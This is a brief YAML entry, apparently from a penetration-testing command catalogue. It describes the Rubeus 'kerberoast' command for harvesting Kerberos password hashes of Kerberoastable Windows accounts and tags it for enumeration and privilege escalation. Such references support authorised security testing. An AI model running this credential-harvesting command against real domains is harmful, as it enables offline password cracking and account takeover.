---
description: |
  Get Kerberos password hashes from all Kerberoastable users

  Command Reference:


command: |
  Rubeus.exe kerberoast
items:
  - Shell
target: |
  - Windows_target
OS:
  - Windows
environment: |
  - Local
  - Network
command_types:
  - Host_Enumeration
  - Privilege_Escalation
services:
  - Kerberos
references:
  - https://github.com/GhostPack/Rubeus
---
